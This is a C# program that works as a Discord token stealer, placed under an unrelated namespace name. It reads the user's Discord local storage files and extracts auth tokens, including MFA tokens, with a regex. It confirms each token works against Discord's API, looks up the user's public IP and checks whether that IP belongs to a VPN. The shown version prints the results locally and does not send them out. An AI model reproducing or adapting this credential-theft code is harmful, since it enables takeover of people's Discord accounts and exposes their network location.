using System;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

namespace BlinkStripControl
{
    class Discord
    {

        static string Email = "CHANGE";

        static void Main(string[] args)
        {
            foreach (string e in GetToken())
            {
                Console.WriteLine(e);
            }
            Console.ReadLine();
        }

        /// <summary>
        /// Get and verify the Discord token.
        /// </summary>
        /// <returns>The Discord token or an error message.</returns>
        static string[] GetToken()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(path)) return new string[] { "Discord Not Installed." };

            string[] ldb = Directory.GetFiles(path, "*.ldb");

            foreach (var ldb_file in ldb)
            {
                // Get IP and Token
                string ip = GrabIP();
                var text = File.ReadAllText(ldb_file);

                // Verify Valid Token Format
                string token_reg =
                    @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
                Match token = Regex.Match(text, token_reg);
                if (token.Success)
                {
                    // Verify Valid Token
                    if (CheckToken(token.Value))
                    {
                        string[] finalData = { token.Value, ip, GetVPN(ip) };
                        return finalData;
                    }
                }
                continue;
            }

            return new string[] { "No Valid Tokens Found." };
        }

        /// <summary>
        /// Check the Discord token.
        /// </summary>
        /// <returns>true if the token is valid, false otherwise.</returns>
        static bool CheckToken(string token)
        {
            try
            {
                var http = new WebClient();
                http.Headers.Add("Authorization", token);
                var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
                if (!result.Contains("Unauthorized")) return true;
            }
            catch { }
            return false;
        }

        /// <summary>
        /// Return the user's IP.
        /// </summary>
        /// <returns>The Discord token or an error message.</returns>
        static string GrabIP()
        {
            return new WebClient().DownloadString("https://ip.42.pl/raw");
        }

        /// <summary>
        /// Get if user's IP is a vpn.
        /// </summary>
        /// <returns>YES, LIKELY, UNLIKELY, or NO</returns>
        static string GetVPN(string ip)
        {
            if (Email == "CHANGE") return "CHANGE EMAIL";
            try
            {
                string query = new WebClient().DownloadString("https://check.getipintel.net/check.php?ip=" + ip + "&contact=" + Email);
                float val = float.Parse(query);

                if (val < 0) return "UNKNOWN";
                else if (val == 0) return "NO";
                else if (val > 0 && val < 0.5) return "UNLIKELY";
                else if (val > 0.5 && val < 0.8) return "LIKELY";
                else if (val > 0.8) return "YES";
                else return "UNKNOWN";


            }
            catch (WebException ex)
            {
                if (ex.Message.Contains("(400) Bad Request")) return "LIKELY";
                else return "UNKNOWN";
            }
        }
    }
}
